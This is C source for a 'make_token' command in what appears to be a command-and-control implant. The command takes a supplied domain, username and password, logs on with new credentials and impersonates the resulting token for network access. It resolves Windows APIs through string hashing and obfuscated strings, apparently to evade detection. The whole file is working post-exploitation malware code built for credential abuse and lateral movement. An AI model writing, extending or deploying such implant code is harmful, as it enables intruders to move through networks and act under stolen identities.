#include "config.h"
#ifdef INCLUDE_CMD_MAKE_TOKEN

#include "commands.h"
#include "common.h"

typedef BOOL (WINAPI *fn_LogonUserA)(LPSTR, LPSTR, LPSTR, DWORD, DWORD, PHANDLE);
typedef BOOL (WINAPI *fn_ImpersonateLoggedOnUser)(HANDLE);

#define LOGON32_LOGON_NEW_CREDENTIALS 9
#define LOGON32_PROVIDER_DEFAULT      0

// make_token <domain> <user> <password>: logon with new credentials and
// impersonate for network operations (no local token required)
VOID cmd_make_token(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD dom_len = 0, user_len = 0, pass_len = 0;
    char* domain = parser_string(args, &dom_len);
    char* user = parser_string(args, &user_len);
    char* pass = parser_string(args, &pass_len);
    if (!user || user_len == 0) {
        package_add_string(inst, response, XSTR("No username specified"));
        response->is_error = TRUE;
        return;
    }

    xstr(_adv, "advapi32.dll");
    HMODULE h_adv = inst->Win32.LoadLibraryA(_adv);
    if (!h_adv) {
        package_add_string(inst, response, XSTR("advapi32 load failed"));
        response->is_error = TRUE;
        return;
    }
    fn_LogonUserA pLogonUserA = (fn_LogonUserA)resolve_function((PVOID)h_adv, hash_string_djb2(XSTR("LogonUserA")));
    fn_ImpersonateLoggedOnUser pImpersonate = (fn_ImpersonateLoggedOnUser)resolve_function((PVOID)h_adv, hash_string_djb2(XSTR("ImpersonateLoggedOnUser")));
    if (!pLogonUserA || !pImpersonate) {
        package_add_string(inst, response, XSTR("advapi32 API resolve failed"));
        response->is_error = TRUE;
        return;
    }

    char dom_user[512] = {0};
    DWORD pos = 0;
    if (domain && dom_len > 0) {
        for (DWORD i = 0; i < dom_len && pos < 500; i++) dom_user[pos++] = domain[i];
        dom_user[pos++] = '\\';
    }
    for (DWORD i = 0; user[i] && pos < 508; i++) dom_user[pos++] = user[i];

    char dom_buf[256] = {0}, user_buf[256] = {0}, pass_buf[256] = {0};
    if (domain && dom_len > 0 && dom_len < 256) {
        // LogonUserA takes domain and user separately; strip the joined prefix
        DWORD j = 0;
        for (DWORD i = 0; i < dom_len && j < 255; i++) dom_buf[j++] = domain[i];
    }
    for (DWORD i = 0; user[i] && i < 255; i++) user_buf[i] = user[i];
    for (DWORD i = 0; pass && pass[i] && i < 255; i++) pass_buf[i] = pass[i];

    HANDLE h_token = NULL;
    if (!pLogonUserA(user_buf, dom_buf, pass_buf,
                     LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &h_token) || !h_token) {
        package_add_string(inst, response, XSTR("LogonUserA failed (bad credentials or no rights)"));
        response->is_error = TRUE;
        return;
    }

    if (!pImpersonate(h_token)) {
        gate_CloseHandle(inst, h_token);
        package_add_string(inst, response, XSTR("ImpersonateLoggedOnUser failed"));
        response->is_error = TRUE;
        return;
    }

    if (inst->ImpersonationToken) gate_CloseHandle(inst, inst->ImpersonationToken);
    inst->ImpersonationToken = h_token;

    package_add_string(inst, response, dom_user);
}

#endif
